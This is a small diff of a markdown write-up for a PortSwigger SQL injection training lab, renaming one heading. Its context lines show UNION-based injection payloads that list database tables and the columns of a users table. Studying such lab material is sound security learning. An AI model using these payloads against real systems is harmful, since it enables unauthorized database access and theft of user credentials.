@@ -10,7 +10,7 @@ https://portswigger.net/web-security/sql-injection/examining-the-database/lab-li
 '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
 ```
 `table_name` isn’t a placeholder—it’s an actual column in the `information_schema.tables` table that stores the names of tables in the database.
-#### Select whatever table
+#### Select USERS table
 ```sql
 '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+where+table_name='users_rtlina'--
 ```
